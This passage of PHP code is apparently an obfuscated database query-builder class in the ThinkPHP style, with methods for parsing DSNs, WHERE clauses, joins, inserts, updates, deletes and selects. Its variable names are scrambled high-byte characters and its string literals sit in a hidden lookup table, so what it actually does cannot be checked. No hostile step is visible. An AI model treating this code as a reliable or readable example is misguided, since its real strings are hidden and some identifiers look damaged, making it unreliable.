$ê©¤¼ûã[$åĞ°î‰²[21]][$®“ù‡Ú†] : $ê©¤¼ûã[$åĞ°î‰²[21]][0], $åĞ°î‰²[990] => isset($ê©¤¼ûã[$åĞ°î‰²[990]][$®“ù‡Ú†]) ? $ê©¤¼ûã[$åĞ°î‰²[990]][$®“ù‡Ú†] : $ê©¤¼ûã[$åĞ°î‰²[990]][0], $åĞ°î‰²[17] => isset($ê©¤¼ûã[$åĞ°î‰²[17]][$®“ù‡Ú†]) ? $ê©¤¼ûã[$åĞ°î‰²[17]][$®“ù‡Ú†] : $ê©¤¼ûã[$åĞ°î‰²[17]][0]); return $this->connect($ÃÂ­½‡”, $®“ù‡Ú†); } public function parseDSN($ºá°§¦Ï) { $ƒşÊŸé‚ =& $_SERVER[Š—Â“œÔ]; if (empty($ºá°§¦Ï)) { return !1; } $¶ÚøÛÅ– = parse_url($ºá°§¦Ï); if ($¶ÚøÛÅ–[$ƒşÊŸé‚[207]]) { $ÂÓÏ³— = array($ƒşÊŸé‚[1035] => $¶ÚøÛÅ–[$ƒşÊŸé‚[207]], $ƒşÊŸé‚[962] => isset($¶ÚøÛÅ–[$ƒşÊŸé‚[667]]) ? $¶ÚøÛÅ–[$ƒşÊŸé‚[667]] : $ƒşÊŸé‚[12], $ƒşÊŸé‚[963] => isset($¶ÚøÛÅ–[$ƒşÊŸé‚[1059]]) ? $¶ÚøÛÅ–[$ƒşÊŸé‚[1059]] : $ƒşÊŸé‚[12], $ƒşÊŸé‚[960] => isset($¶ÚøÛÅ–[$ƒşÊŸé‚[208]]) ? $¶ÚøÛÅ–[$ƒşÊŸé‚[208]] : $ƒşÊŸé‚[12], $ƒşÊŸé‚[961] => isset($¶ÚøÛÅ–[$ƒşÊŸé‚[209]]) ? $¶ÚøÛÅ–[$ƒşÊŸé‚[209]] : $ƒşÊŸé‚[12], $ƒşÊŸé‚[21] => isset($¶ÚøÛÅ–[$ƒşÊŸé‚[87]]) ? substr($¶ÚøÛÅ–[$ƒşÊŸé‚[87]], 1) : $ƒşÊŸé‚[12]); } else { preg_match($ƒşÊŸé‚[1060], trim($ºá°§¦Ï), $Ü¥ĞÛë´); $ÂÓÏ³— = array($ƒşÊŸé‚[1035] => $Ü¥ĞÛë´[1], $ƒşÊŸé‚[962] => $Ü¥ĞÛë´[2], $ƒşÊŸé‚[963] => $Ü¥ĞÛë´[3], $ƒşÊŸé‚[960] => $Ü¥ĞÛë´[4], $ƒşÊŸé‚[961] => $Ü¥ĞÛë´[5], $ƒşÊŸé‚[21] => $Ü¥ĞÛë´[6]); } $ÂÓÏ³—[$ƒşÊŸé‚[990]] = $ƒşÊŸé‚[12]; return $ÂÓÏ³—; } protected function debug() { $úû¥Àó¬ =& $_SERVER[Š—Â“œÔ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $úû¥Àó¬[1061]; if (think_config($úû¥Àó¬[1062])) { think_status($úû¥Àó¬[1063]); think_trace($this->queryStr . $úû¥Àó¬[1064] . think_status($úû¥Àó¬[24], $úû¥Àó¬[1063], 6) . $úû¥Àó¬[1065], $úû¥Àó¬[12], $úû¥Àó¬[1066]); } } protected function parseLock($ñë½½—½ = false) { $å¡÷ùÛ =& $_SERVER[Š—Â“œÔ]; if (!$ñë½½—½) { return $å¡÷ùÛ[12]; } if ($å¡÷ùÛ[992] == $this->dbType) { return $å¡÷ùÛ[1067]; } return $å¡÷ùÛ[1068]; } protected function parseSet($åÁú£ü) { $ÖªıÎÉÖ =& $_SERVER[Š—Â“œÔ]; foreach ($åÁú£ü as $¤ä–Ö‰ => $™ÛëÖ) { if (is_array($™ÛëÖ) && $ÖªıÎÉÖ[374] == $™ÛëÖ[0]) { $¥ÀïÙç¯[] = $this->parseKey($¤ä–Ö‰) . $ÖªıÎÉÖ[508] . $™ÛëÖ[1]; } elseif (is_scalar($™ÛëÖ) || is_null($™ÛëÖ)) { $¥ÀïÙç¯[] = $this->parseKey($¤ä–Ö‰) . $ÖªıÎÉÖ[508] . $this->parseValue($™ÛëÖ); } } return $ÖªıÎÉÖ[1069] . implode($ÖªıÎÉÖ[50], $¥ÀïÙç¯); } protected function bindParam($˜œ‰„Î®, $æ’”‘Ü¿) { $this->bind[$_SERVER[Š—Â“œÔ][4] . $˜œ‰„Î®] = $æ’”‘Ü¿; } protected function parseBind($ì‚¿š‚Ë) { $ì‚¿š‚Ë = array_merge($this->bind, $ì‚¿š‚Ë); $this->bind = array(); return $ì‚¿š‚Ë; } function parseKey(&$¹ã¢¢, $²ĞŠÇ³Ğ = true) { if ($²ĞŠÇ³Ğ) { $¹ã¢¢ = $this->parseKeyCheck($¹ã¢¢); } return $¹ã¢¢; } function parseKeyCheck($Ûİ ‹ª¼) { $¥Ú‘Åº¬ =& $_SERVER[Š—Â“œÔ]; $Ûİ ‹ª¼ = trim($Ûİ ‹ª¼); if (!preg_match($¥Ú‘Åº¬[1070], $Ûİ ‹ª¼)) { think_exception($¥Ú‘Åº¬[1071] . $Ûİ ‹ª¼); } return $Ûİ ‹ª¼; } protected function parseValue($ôÔÑØä) { $œıúúÕ¾ =& $_SERVER[Š—Â“œÔ]; if (is_string($ôÔÑØä)) { $ôÔÑØä = $œıúúÕ¾[1031] . $this->escapeString($ôÔÑØä) . $œıúúÕ¾[1031]; } elseif (isset($ôÔÑØä[0]) && is_string($ôÔÑØä[0]) && strtolower($ôÔÑØä[0]) == $œıúúÕ¾[374]) { $ôÔÑØä = $this->escapeString($ôÔÑØä[1]); } elseif (is_array($ôÔÑØä)) { $ôÔÑØä = array_map(array($this, $œıúúÕ¾[1032]), $ôÔÑØä); } elseif (is_bool($ôÔÑØä)) { $ôÔÑØä = $ôÔÑØä ? $œıúúÕ¾[91] : $œıúúÕ¾[230]; } elseif (is_null($ôÔÑØä)) { $ôÔÑØä = $œıúúÕ¾[106]; } return $ôÔÑØä; } protected function parseField($Œ©ÇËÁ) { $ı¸ÕÌû‹ =& $_SERVER[Š—Â“œÔ]; if (is_string($Œ©ÇËÁ) && strpos($Œ©ÇËÁ, $ı¸ÕÌû‹[50])) { $Œ©ÇËÁ = explode($ı¸ÕÌû‹[50], $Œ©ÇËÁ); } if (is_array($Œ©ÇËÁ)) { $œÆæËø² = array(); foreach ($Œ©ÇËÁ as $Ÿ»¨¸ÜÜ => $ßéº…Àä) { if (!is_numeric($Ÿ»¨¸ÜÜ)) { $œÆæËø²[] = $this->parseKey($Ÿ»¨¸ÜÜ, !1) . $ı¸ÕÌû‹[1072] . $this->parseKey($ßéº…Àä); } else { $œÆæËø²[] = $this->parseKey($ßéº…Àä); } } $¸ª·‚ğ = implode($ı¸ÕÌû‹[50], $œÆæËø²); } elseif (is_string($Œ©ÇËÁ) && !empty($Œ©ÇËÁ)) { $¸ª·‚ğ = $Œ©ÇËÁ; } else { $¸ª·‚ğ = $ı¸ÕÌû‹[222]; } return $¸ª·‚ğ; } protected function parseTable($–çíù€„) { $º£İÕ²Ú =& $_SERVER[Š—Â“œÔ]; if (is_array($–çíù€„)) { $èë‚Û²ñ = array(); foreach ($–çíù€„ as $˜®õ¯í€ => $ä‚ªŒ“•) { if (!is_numeric($˜®õ¯í€)) { $èë‚Û²ñ[] = $this->parseKey($˜®õ¯í€) . $º£İÕ²Ú[53] . $this->parseKey($ä‚ªŒ“•); } else { $èë‚Û²ñ[] = $this->parseKey($˜®õ¯í€); } } $–çíù€„ = $èë‚Û²ñ; } elseif (is_string($–çíù€„)) { if (strstr($–çíù€„, $º£İÕ²Ú[53])) { return $–çíù€„; } $–çíù€„ = explode($º£İÕ²Ú[50], $–çíù€„); array_walk($–çíù€„, array($this, $º£İÕ²Ú[980])); } return $º£İÕ²Ú[974] . trim(implode($º£İÕ²Ú[1073], $–çíù€„), $º£İÕ²Ú[463]) . $º£İÕ²Ú[974]; } protected function parseWhere($«ÎÚŸ©Ç) { $üÂıåŸ =& $_SERVER[Š—Â“œÔ]; $Ú÷îÊçÊ = $üÂıåŸ[12]; if (is_string($«ÎÚŸ©Ç)) { $Ú÷îÊçÊ = $«ÎÚŸ©Ç; } else { $îàÚ¢“ñ = isset($«ÎÚŸ©Ç[$üÂıåŸ[1074]]) ? strtoupper($«ÎÚŸ©Ç[$üÂıåŸ[1074]]) : $üÂıåŸ[12]; if (in_array($îàÚ¢“ñ, array($üÂıåŸ[1075], $üÂıåŸ[1076], $üÂıåŸ[1077]))) { $îàÚ¢“ñ = $üÂıåŸ[53] . $îàÚ¢“ñ . $üÂıåŸ[53]; unset($«ÎÚŸ©Ç[$üÂıåŸ[1074]]); } else { $îàÚ¢“ñ = $üÂıåŸ[1078]; } foreach ($«ÎÚŸ©Ç as $ØÃ¦Èäï => $£çµ­†×) { $Ú÷îÊçÊ .= $üÂıåŸ[356]; if (is_numeric($ØÃ¦Èäï)) { $ØÃ¦Èäï = $üÂıåŸ[1079]; } if (0 === strpos($ØÃ¦Èäï, $üÂıåŸ[11])) { $Ú÷îÊçÊ .= $this->parseThinkWhere($ØÃ¦Èäï, $£çµ­†×); } else { if (!preg_match($üÂıåŸ[1080], trim($ØÃ¦Èäï))) { think_exception(think_lang($üÂıåŸ[1081]) . $üÂıåŸ[4] . $ØÃ¦Èäï); } $ÈùË êù = is_array($£çµ­†×) && isset($£çµ­†×[$üÂıåŸ[1082]]); $ØÃ¦Èäï = trim($ØÃ¦Èäï); if (strpos($ØÃ¦Èäï, $üÂıåŸ[214])) { $˜µ—‰§É = explode($üÂıåŸ[214], $ØÃ¦Èäï); $ä…ƒˆÄ = array(); foreach ($˜µ—‰§É as $ÅÎŠÁúà => $óí³”˜) { $€…ëê ğ = $ÈùË êù ? $£çµ­†×[$ÅÎŠÁúà] : $£çµ­†×; $ä…ƒˆÄ[] = $üÂıåŸ[339] . $this->parseWhereItem($this->parseKey($óí³”˜), $€…ëê ğ) . $üÂıåŸ[979]; } $Ú÷îÊçÊ .= implode($üÂıåŸ[1083], $ä…ƒˆÄ); } elseif (strpos($ØÃ¦Èäï, $üÂıåŸ[286])) { $˜µ—‰§É = explode($üÂıåŸ[286], $ØÃ¦Èäï); $ä…ƒˆÄ = array(); foreach ($˜µ—‰§É as $ÅÎŠÁúà => $óí³”˜) { $€…ëê ğ = $ÈùË êù ? $£çµ­†×[$ÅÎŠÁúà] : $£çµ­†×; $ä…ƒˆÄ[] = $üÂıåŸ[339] . $this->parseWhereItem($this->parseKey($óí³”˜), $€…ëê ğ) . $üÂıåŸ[979]; } $Ú÷îÊçÊ .= implode($üÂıåŸ[1078], $ä…ƒˆÄ); } else { $Ú÷îÊçÊ .= $this->parseWhereItem($this->parseKey($ØÃ¦Èäï), $£çµ­†×); } } $Ú÷îÊçÊ .= $üÂıåŸ[357] . $îàÚ¢“ñ; } $Ú÷îÊçÊ = substr($Ú÷îÊçÊ, 0, -strlen($îàÚ¢“ñ)); } return empty($Ú÷îÊçÊ) ? $üÂıåŸ[12] : $üÂıåŸ[1084] . $Ú÷îÊçÊ; } protected function parseWhereItem($âÔ¨¿Ğš, $™œ„Å „) { $ÁÇ–‹Ğ¤ =& $_SERVER[Š—Â“œÔ]; $®ÀØÓ·· = $ÁÇ–‹Ğ¤[12]; if (is_array($™œ„Å „)) { if (is_string($™œ„Å „[0])) { $ßú°³´Ò = strtolower($™œ„Å „[0]); if (in_array($™œ„Å „[0], array($ÁÇ–‹Ğ¤[508], $ÁÇ–‹Ğ¤[1085], $ÁÇ–‹Ğ¤[1086], $ÁÇ–‹Ğ¤[1087], $ÁÇ–‹Ğ¤[1088], $ÁÇ–‹Ğ¤[1089]))) { $®ÀØÓ·· .= $âÔ¨¿Ğš . $ÁÇ–‹Ğ¤[53] . $™œ„Å „[0] . $ÁÇ–‹Ğ¤[53] . $this->parseValue($™œ„Å „[1]); } elseif (preg_match($ÁÇ–‹Ğ¤[1090], $™œ„Å „[0])) { $®ÀØÓ·· .= $âÔ¨¿Ğš . $ÁÇ–‹Ğ¤[53] . $this->exp[$ßú°³´Ò] . $ÁÇ–‹Ğ¤[53] . $this->parseValue($™œ„Å „[1]); } elseif (preg_match($ÁÇ–‹Ğ¤[1091], $™œ„Å „[0])) { if (is_array($™œ„Å „[1])) { $Ó›ç£üÍ = isset($™œ„Å „[2]) ? strtoupper($™œ„Å „[2]) : $ÁÇ–‹Ğ¤[1076]; if (in_array($Ó›ç£üÍ, array($ÁÇ–‹Ğ¤[1075], $ÁÇ–‹Ğ¤[1076], $ÁÇ–‹Ğ¤[1077]))) { $¡¹Óˆù  = array(); foreach ($™œ„Å „[1] as $ñ˜€€§½) { $¡¹Óˆù [] = $âÔ¨¿Ğš . $ÁÇ–‹Ğ¤[53] . $this->exp[$ßú°³´Ò] . $ÁÇ–‹Ğ¤[53] . $this->parseValue($ñ˜€€§½); } $®ÀØÓ·· .= $ÁÇ–‹Ğ¤[339] . implode($ÁÇ–‹Ğ¤[53] . $Ó›ç£üÍ . $ÁÇ–‹Ğ¤[53], $¡¹Óˆù ) . $ÁÇ–‹Ğ¤[979]; } } else { $®ÀØÓ·· .= $âÔ¨¿Ğš . $ÁÇ–‹Ğ¤[53] . $this->exp[$ßú°³´Ò] . $ÁÇ–‹Ğ¤[53] . $this->parseValue($™œ„Å „[1]); } } elseif ($ÁÇ–‹Ğ¤[374] == $ßú°³´Ò) { $®ÀØÓ·· .= $ÁÇ–‹Ğ¤[977] . $âÔ¨¿Ğš . $ÁÇ–‹Ğ¤[53] . $™œ„Å „[1] . $ÁÇ–‹Ğ¤[1092]; } elseif (preg_match($ÁÇ–‹Ğ¤[1093], $™œ„Å „[0])) { $®ÀØÓ·· .= $™œ„Å „[0]; } elseif (preg_match($ÁÇ–‹Ğ¤[1094], $™œ„Å „[0])) { if (isset($™œ„Å „[2]) && $ÁÇ–‹Ğ¤[374] == $™œ„Å „[2]) { $®ÀØÓ·· .= $âÔ¨¿Ğš . $ÁÇ–‹Ğ¤[53] . $this->exp[$ßú°³´Ò] . $ÁÇ–‹Ğ¤[53] . $™œ„Å „[1]; } else { if (is_string($™œ„Å „[1])) { $™œ„Å „[1] = explode($ÁÇ–‹Ğ¤[50], $™œ„Å „[1]); } $ÅÁÑ«ñ = implode($ÁÇ–‹Ğ¤[50], $this->parseValue($™œ„Å „[1])); $®ÀØÓ·· .= $âÔ¨¿Ğš . $ÁÇ–‹Ğ¤[53] . $this->exp[$ßú°³´Ò] . $ÁÇ–‹Ğ¤[977] . $ÅÁÑ«ñ . $ÁÇ–‹Ğ¤[979]; } } elseif (preg_match($ÁÇ–‹Ğ¤[1095], $™œ„Å „[0])) { $±¦ôõÂ‹ = is_string($™œ„Å „[1]) ? explode($ÁÇ–‹Ğ¤[50], $™œ„Å „[1]) : $™œ„Å „[1]; $®ÀØÓ·· .= $ÁÇ–‹Ğ¤[977] . $âÔ¨¿Ğš . $ÁÇ–‹Ğ¤[53] . $this->exp[$ßú°³´Ò] . $ÁÇ–‹Ğ¤[53] . $this->parseValue($±¦ôõÂ‹[0]) . $ÁÇ–‹Ğ¤[1078] . $this->parseValue($±¦ôõÂ‹[1]) . $ÁÇ–‹Ğ¤[357]; } else { think_exception(think_lang($ÁÇ–‹Ğ¤[1081]) . $ÁÇ–‹Ğ¤[4] . $™œ„Å „[0]); } } else { $ô¯“í¶ = count($™œ„Å „); $¯¨¸ÆÜ· = $ÁÇ–‹Ğ¤[12]; if (is_string($™œ„Å „[$ô¯“í¶ - 1])) { $¯¨¸ÆÜ· = isset($™œ„Å „[$ô¯“í¶ - 1]) ? strtoupper($™œ„Å „[$ô¯“í¶ - 1]) : $ÁÇ–‹Ğ¤[12]; if (in_array($¯¨¸ÆÜ·, array($ÁÇ–‹Ğ¤[1075], $ÁÇ–‹Ğ¤[1076], $ÁÇ–‹Ğ¤[1077]))) { $ô¯“í¶ = $ô¯“í¶ - 1; } } else { $¯¨¸ÆÜ· = $ÁÇ–‹Ğ¤[1075]; } for ($¶óßÎñ‡ = 0; $¶óßÎñ‡ < $ô¯“í¶; $¶óßÎñ‡++) { $±¦ôõÂ‹ = is_array($™œ„Å „[$¶óßÎñ‡]) ? $™œ„Å „[$¶óßÎñ‡][1] : $™œ„Å „[$¶óßÎñ‡]; if ($ÁÇ–‹Ğ¤[374] == strtolower($™œ„Å „[$¶óßÎñ‡][0])) { $®ÀØÓ·· .= $ÁÇ–‹Ğ¤[339] . $âÔ¨¿Ğš . $ÁÇ–‹Ğ¤[53] . $±¦ôõÂ‹ . $ÁÇ–‹Ğ¤[1092] . $¯¨¸ÆÜ· . $ÁÇ–‹Ğ¤[53]; } else { $ùòİŠĞÓ = is_array($™œ„Å „[$¶óßÎñ‡]) ? $this->exp[strtolower($™œ„Å „[$¶óßÎñ‡][0])] : $ÁÇ–‹Ğ¤[508]; if (!$ùòİŠĞÓ && is_array($™œ„Å „[$¶óßÎñ‡]) && in_array($™œ„Å „[$¶óßÎñ‡][0], array($ÁÇ–‹Ğ¤[508], $ÁÇ–‹Ğ¤[1085], $ÁÇ–‹Ğ¤[1086], $ÁÇ–‹Ğ¤[1087], $ÁÇ–‹Ğ¤[1088], $ÁÇ–‹Ğ¤[1089]))) { $ùòİŠĞÓ = $™œ„Å „[$¶óßÎñ‡][0]; } $®ÀØÓ·· .= $ÁÇ–‹Ğ¤[339] . $âÔ¨¿Ğš . $ÁÇ–‹Ğ¤[53] . $ùòİŠĞÓ . $ÁÇ–‹Ğ¤[53] . $this->parseValue($±¦ôõÂ‹) . $ÁÇ–‹Ğ¤[1092] . $¯¨¸ÆÜ· . $ÁÇ–‹Ğ¤[53]; } } $®ÀØÓ·· = substr($®ÀØÓ··, 0, -4); } } else { $®ÀØÓ·· .= $âÔ¨¿Ğš . $ÁÇ–‹Ğ¤[1096] . $this->parseValue($™œ„Å „); } return $®ÀØÓ··; } protected function parseThinkWhere($Ñº§ûµœ, $£İ”´›‹) { $Õˆ–ù¦£ =& $_SERVER[Š—Â“œÔ]; $÷Ú«Äñ = $Õˆ–ù¦£[12]; switch ($Ñº§ûµœ) { case $Õˆ–ù¦£[429]: $÷Ú«Äñ = $£İ”´›‹; break; case $Õˆ–ù¦£[1079]: $÷Ú«Äñ = is_string($£İ”´›‹) ? $£İ”´›‹ : substr($this->parseWhere($£İ”´›‹), 6); break; case $Õˆ–ù¦£[1097]: parse_str($£İ”´›‹, $ì‹“Î£); if (isset($ì‹“Î£[$Õˆ–ù¦£[1074]])) { $Åè¨Å£Ã = $Õˆ–ù¦£[53] . strtoupper($ì‹“Î£[$Õˆ–ù¦£[1074]]) . $Õˆ–ù¦£[53]; unset($ì‹“Î£[$Õˆ–ù¦£[1074]]); } else { $Åè¨Å£Ã = $Õˆ–ù¦£[1078]; } $”Œ¯ºªæ = array(); foreach ($ì‹“Î£ as $Ãû­Çäú => $µüäÉ ½) { $”Œ¯ºªæ[] = $this->parseKey($Ãû­Çäú) . $Õˆ–ù¦£[1096] . $this->parseValue($µüäÉ ½); } $÷Ú«Äñ = implode($Åè¨Å£Ã, $”Œ¯ºªæ); break; } return $÷Ú«Äñ; } protected function parseLimit($·Ù«ÍŒ¼) { $ƒò½àøÌ =& $_SERVER[Š—Â“œÔ]; return !empty($·Ù«ÍŒ¼) ? $ƒò½àøÌ[51] . $·Ù«ÍŒ¼ . $ƒò½àøÌ[53] : $ƒò½àøÌ[12]; } protected function parseJoin($Ÿ¦¿•©”) { $ç‹ºë½İ =& $_SERVER[Š—Â“œÔ]; $ï¯ŞÏù = $ç‹ºë½İ[12]; if (!empty($Ÿ¦¿•©”)) { if (is_array($Ÿ¦¿•©”)) { foreach ($Ÿ¦¿•©” as $Å®éÓ¦á => $á’éºğ) { if (!1 !== stripos($á’éºğ, $ç‹ºë½İ[1098])) { $ï¯ŞÏù .= $ç‹ºë½İ[53] . $á’éºğ; } else { $ï¯ŞÏù .= $ç‹ºë½İ[1099] . $á’éºğ; } } } else { $ï¯ŞÏù .= $ç‹ºë½İ[1099] . $Ÿ¦¿•©”; } } $ï¯ŞÏù = preg_replace($ç‹ºë½İ[1100], think_config($ç‹ºë½İ[1004]) . $ç‹ºë½İ[1101], $ï¯ŞÏù); return $ï¯ŞÏù; } protected function parseOrder($›¥¤êŒ) { $÷ª“İ²³ =& $_SERVER[Š—Â“œÔ]; if (is_array($›¥¤êŒ)) { $å†Ÿ™¶İ = array(); foreach ($›¥¤êŒ as $êÖ¬éÉ½ => $ÁòÍ«Ç) { if (is_numeric($êÖ¬éÉ½)) { $å†Ÿ™¶İ[] = $this->parseKey($ÁòÍ«Ç); } else { $ÁòÍ«Ç = in_array(strtoupper(trim($ÁòÍ«Ç)), array($÷ª“İ²³[1102], $÷ª“İ²³[1103])) ? $÷ª“İ²³[53] . $ÁòÍ«Ç : $÷ª“İ²³[12]; if (preg_match($÷ª“İ²³[1104], $êÖ¬éÉ½)) { $å†Ÿ™¶İ[] = $this->parseKey($êÖ¬éÉ½) . $ÁòÍ«Ç; } else { think_exception($÷ª“İ²³[1105] . $êÖ¬éÉ½); } } } $›¥¤êŒ = implode($÷ª“İ²³[50], $å†Ÿ™¶İ); } return !empty($›¥¤êŒ) ? $÷ª“İ²³[1106] . $›¥¤êŒ : $÷ª“İ²³[12]; } protected function parseGroup($ßÍı«ìÛ) { $Ãß“£Ñ² =& $_SERVER[Š—Â“œÔ]; return !empty($ßÍı«ìÛ) ? $Ãß“£Ñ²[1107] . $ßÍı«ìÛ : $Ãß“£Ñ²[12]; } protected function parseHaving($©ò›¹) { $Ø¦¿Ğ’£ =& $_SERVER[Š—Â“œÔ]; return !empty($©ò›¹) ? $Ø¦¿Ğ’£[1108] . $©ò›¹ : $Ø¦¿Ğ’£[12]; } protected function parseComment($Åæ²Óù²) { $¤´†ÊÙÑ =& $_SERVER[Š—Â“œÔ]; return !empty($Åæ²Óù²) ? $¤´†ÊÙÑ[1109] . $Åæ²Óù² . $¤´†ÊÙÑ[1110] : $¤´†ÊÙÑ[12]; } protected function parseDistinct($Åš±æ’) { $‰ Ÿ =& $_SERVER[Š—Â“œÔ]; return !empty($Åš±æ’) ? $‰ Ÿ[1111] : $‰ Ÿ[12]; } protected function parseUnion($®£ô„¹ş) { $öÇš° =& $_SERVER[Š—Â“œÔ]; if (empty($®£ô„¹ş)) { return $öÇš°[12]; } if (isset($®£ô„¹ş[$öÇš°[425]])) { $ôœ‹”£û = $öÇš°[1112]; unset($®£ô„¹ş[$öÇš°[425]]); } else { $ôœ‹”£û = $öÇš°[1113]; } foreach ($®£ô„¹ş as $öÑŠ´Ë¬) { $Ÿúššø[] = $ôœ‹”£û . (is_array($öÑŠ´Ë¬) ? $this->buildSelectSql($öÑŠ´Ë¬) : $öÑŠ´Ë¬); } return implode($öÇš°[53], $Ÿúššø); } public function insert($„¥ªÂºö, $ÀôÂÒÎ = array(), $·æ†‰Ç‚ = false) { $âÆúµ¹× =& $_SERVER[Š—Â“œÔ]; $„ïİç‚† = $èíş«— = array(); $this->model = $ÀôÂÒÎ[$âÆúµ¹×[360]]; foreach ($„¥ªÂºö as $ÜˆÚÙ¤÷ => $úÉ¡‘Äö) { if (is_array($úÉ¡‘Äö) && $âÆúµ¹×[374] == $úÉ¡‘Äö[0]) { $èíş«—[] = $this->parseKey($ÜˆÚÙ¤÷); $„ïİç‚†[] = $úÉ¡‘Äö[1]; } elseif (is_scalar($úÉ¡‘Äö) || is_null($úÉ¡‘Äö)) { $èíş«—[] = $this->parseKey($ÜˆÚÙ¤÷); $„ïİç‚†[] = $this->parseValue($úÉ¡‘Äö); } } $÷ßâ­šÇ = ($·æ†‰Ç‚ ? $âÆúµ¹×[981] : $âÆúµ¹×[982]) . $âÆúµ¹×[983] . $this->parseTable($ÀôÂÒÎ[$âÆúµ¹×[358]]) . $âÆúµ¹×[977] . implode($âÆúµ¹×[50], $èíş«—) . $âÆúµ¹×[978] . implode($âÆúµ¹×[50], $„ïİç‚†) . $âÆúµ¹×[979]; $÷ßâ­šÇ .= $this->parseLock(isset($ÀôÂÒÎ[$âÆúµ¹×[911]]) ? $ÀôÂÒÎ[$âÆúµ¹×[911]] : !1); $÷ßâ­šÇ .= $this->parseComment(!empty($ÀôÂÒÎ[$âÆúµ¹×[431]]) ? $ÀôÂÒÎ[$âÆúµ¹×[431]] : $âÆúµ¹×[12]); return $this->execute($÷ßâ­šÇ, $this->parseBind(!empty($ÀôÂÒÎ[$âÆúµ¹×[362]]) ? $ÀôÂÒÎ[$âÆúµ¹×[362]] : array())); } public function selectInsert($ÆìÇí×, $•¼¡ŞÒï, $ŸŸ«ì›† = array()) { $ú‡Ÿ™”ˆ =& $_SERVER[Š—Â“œÔ]; $this->model = $ŸŸ«ì›†[$ú‡Ÿ™”ˆ[360]]; if (is_string($ÆìÇí×)) { $ÆìÇí× = explode($ú‡Ÿ™”ˆ[50], $ÆìÇí×); } array_walk($ÆìÇí×, array($this, $ú‡Ÿ™”ˆ[980])); $é¶¯Ì×¡ = $ú‡Ÿ™”ˆ[1114] . $this->parseTable($•¼¡ŞÒï) . $ú‡Ÿ™”ˆ[977] . implode($ú‡Ÿ™”ˆ[50], $ÆìÇí×) . $ú‡Ÿ™”ˆ[1092]; $é¶¯Ì×¡ .= $this->buildSelectSql($ŸŸ«ì›†); return $this->execute($é¶¯Ì×¡, $this->parseBind(!empty($ŸŸ«ì›†[$ú‡Ÿ™”ˆ[362]]) ? $ŸŸ«ì›†[$ú‡Ÿ™”ˆ[362]] : array())); } public function update($ÊìÛ®Ù, $Ìó¶˜úÎ) { $óò¤ÏÅ± =& $_SERVER[Š—Â“œÔ]; $this->model = $Ìó¶˜úÎ[$óò¤ÏÅ±[360]]; $¿×¦âãá = $óò¤ÏÅ±[1115] . $this->parseTable($Ìó¶˜úÎ[$óò¤ÏÅ±[358]]) . $this->parseSet($ÊìÛ®Ù) . $this->parseWhere(!empty($Ìó¶˜úÎ[$óò¤ÏÅ±[354]]) ? $Ìó¶˜úÎ[$óò¤ÏÅ±[354]] : $óò¤ÏÅ±[12]) . $this->parseOrder(!empty($Ìó¶˜úÎ[$óò¤ÏÅ±[443]]) ? $Ìó¶˜úÎ[$óò¤ÏÅ±[443]] : $óò¤ÏÅ±[12]) . $this->parseLimit(!empty($Ìó¶˜úÎ[$óò¤ÏÅ±[369]]) ? $Ìó¶˜úÎ[$óò¤ÏÅ±[369]] : $óò¤ÏÅ±[12]) . $this->parseLock(isset($Ìó¶˜úÎ[$óò¤ÏÅ±[911]]) ? $Ìó¶˜úÎ[$óò¤ÏÅ±[911]] : !1) . $this->parseComment(!empty($Ìó¶˜úÎ[$óò¤ÏÅ±[431]]) ? $Ìó¶˜úÎ[$óò¤ÏÅ±[431]] : $óò¤ÏÅ±[12]); return $this->execute($¿×¦âãá, $this->parseBind(!empty($Ìó¶˜úÎ[$óò¤ÏÅ±[362]]) ? $Ìó¶˜úÎ[$óò¤ÏÅ±[362]] : array())); } public function delete($ÚçÒÆÇ§ = array()) { $ê„¬ˆ¡ =& $_SERVER[Š—Â“œÔ]; $this->model = $ÚçÒÆÇ§[$ê„¬ˆ¡[360]]; $Â‡ÅàøÈ = $ê„¬ˆ¡[1116] . $this->parseTable($ÚçÒÆÇ§[$ê„¬ˆ¡[358]]) . $this->parseWhere(!empty($ÚçÒÆÇ§[$ê„¬ˆ¡[354]]) ? $ÚçÒÆÇ§[$ê„¬ˆ¡[354]] : $ê„¬ˆ¡[12]) . $this->parseOrder(!empty($ÚçÒÆÇ§[$ê„¬ˆ¡[443]]) ? $ÚçÒÆÇ§[$ê„¬ˆ¡[443]] : $ê„¬ˆ¡[12]) . $this->parseLimit(!empty($ÚçÒÆÇ§[$ê„¬ˆ¡[369]]) ? $ÚçÒÆÇ§[$ê„¬ˆ¡[369]] : $ê„¬ˆ¡[12]) . $this->parseLock(isset($ÚçÒÆÇ§[$ê„¬ˆ¡[911]]) ? $ÚçÒÆÇ§[$ê„¬ˆ¡[911]] : !1) . $this->parseComment(!empty($ÚçÒÆÇ§[$ê„¬ˆ¡[431]]) ? $ÚçÒÆÇ§[$ê„¬ˆ¡[431]] : $ê„¬ˆ¡[12]); return $this->execute($Â‡ÅàøÈ, $this->parseBind(!empty($ÚçÒÆÇ§[$ê„¬ˆ¡[362]]) ? $ÚçÒÆÇ§[$ê„¬ˆ¡[362]] : array())); } public function select($½×—Ú÷É = array()) { $öÖØ€ğ‡ =& $_SERVER[Š—Â“œÔ]; $this->model = $½×—Ú÷É[$öÖØ€ğ‡[360]]; $¢©Ø·õÒ = $this->buildSelectSql($½×—Ú÷É); $¯ì“Ôí = isset($½×—Ú÷É[$öÖØ€ğ‡[426]]) ? $½×—Ú÷É[$öÖØ€ğ‡[426]] : !1; if ($¯ì“Ôí) { $á¬»êˆ¨ = is_string($¯ì“Ôí[$öÖØ€ğ‡[97]]) ? $¯ì“Ôí[$öÖØ€ğ‡[97]] : $öÖØ€ğ‡[1117] . md5($¢©Ø·õÒ); $©×¶áâö = think_cache($á¬»êˆ¨, $öÖØ€ğ‡[12], $¯ì“Ôí); if (!1 !== $©×¶áâö) { return $©×¶áâö; } } $û›‡ûÇ¯ = $this->query($¢©Ø·õÒ, $this->parseBind(!empty($½×—Ú÷É[$öÖØ€ğ‡[362]]) ? $½×—Ú÷É[$öÖØ€ğ‡[362]] : array())); if ($¯ì“Ôí && !1 !== $û›‡ûÇ¯) { think_cache($á¬»êˆ¨, $û›‡ûÇ¯, $¯ì“Ôí); } return $û›‡ûÇ¯; } public function buildSelectSql($éÎÁüç¹ = array()) { $³‡­â©– =& $_SERVER[Š—Â“œÔ]; if (isset($éÎÁüç¹[$³‡­â©–[430]])) { if (strpos($éÎÁüç¹[$³‡­â©–[430]], $³‡­â©–[50])) { list($ã€ÇİºÉ, $Ú…·âô³) = explode($³‡­â©–[50], 